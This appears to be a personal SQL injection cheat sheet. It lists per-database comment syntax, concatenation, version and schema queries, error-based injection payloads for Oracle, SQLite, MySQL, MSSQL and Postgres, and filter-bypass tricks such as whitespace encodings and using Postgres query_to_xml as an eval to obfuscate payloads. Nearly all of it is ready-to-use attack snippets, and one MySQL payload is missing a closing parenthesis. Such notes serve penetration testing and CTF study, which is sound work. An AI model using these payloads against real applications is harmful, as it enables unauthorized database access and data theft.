* Comments

`--` or `/**/` - Microsoft, Oracle, Postgres, Sqlite
`#`, `-- `, `/**/` - MySQL

* String concat

`CONCAT('a', 'b')` - MySQL, MSSQL, Postgres
`a || b` Postgres, Sqlite, Oracle

* Get DB version

`@@version` - Microsoft
`banner from v$version` - Oracle
`version()` - Postgres
`sqlite_version()` - Sqlite

* DB introspection

`information_schema.tables` - MySQL, MSSQL, Postgres
`name, sql from sqlite_master` - Sqlite
`table_name from all_tables, column_name from all_tab_columns` - Oracle

* Substring

`substring('abc', 1, 2)` - MySQL
`substr('abc', 1, 2)` - Sqlite

* Error-based

`select case when (1=1) then to_char(1/0) else '' end from dual` - Oracle
`select iif(1=1, load_extension(1), '')` - Sqlite
`select if(1=1, (select table_name from information_schema.tables), ''` - MySQL
`select iif(1=1, 1/0, '')` - MSSQL
`select case when (1=1) then cast(1/0 as text) else '' end` - Postgres

* Filter bypass

MySQL keywords: https://dev.mysql.com/doc/refman/8.0/en/sql-data-manipulation-statements.html

** Spaces

`/**/`
`%09 %0a %0b %0c %0d %a0`

** OR/AND

@code
|, ||
&, &&
- (NOT)
= (AND) (1=1 = true)
@end

** substr

`mid('abc', 1, 2) == 'a'`
`left('abc', 1) == 'a'`

** Super tight filter

`ts_stat('que'||'ry')`
`query_to_xml('que'||'ry')`

Basically free eval in Postgres-side, so we can obfuscate the payload.
